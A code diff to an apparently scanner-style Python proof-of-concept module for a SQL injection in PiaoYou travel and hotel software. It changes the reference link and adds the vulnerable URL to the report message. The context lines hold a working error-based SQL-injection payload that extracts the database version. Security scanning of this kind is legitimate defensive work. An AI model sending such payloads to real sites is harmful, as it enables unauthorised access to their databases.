@@ -21,7 +21,7 @@ class Vuln(ABVuln):
         "/travel/Default.aspx?ecity=%E4%B8%8A%E6%B5%B7&leixing=11",
         "/hotel/Default.aspx?s=11", 
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0118867
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0118867'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'PiaoYou(票友软件)'  # 漏洞应用名称
@@ -68,8 +68,8 @@ class Poc(ABPoc):
                     "%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--"
                 code, head, res, errcode, _ = hh.http(vul)
                 if code != 0 and 'WtFaBcMic' in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=vul))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
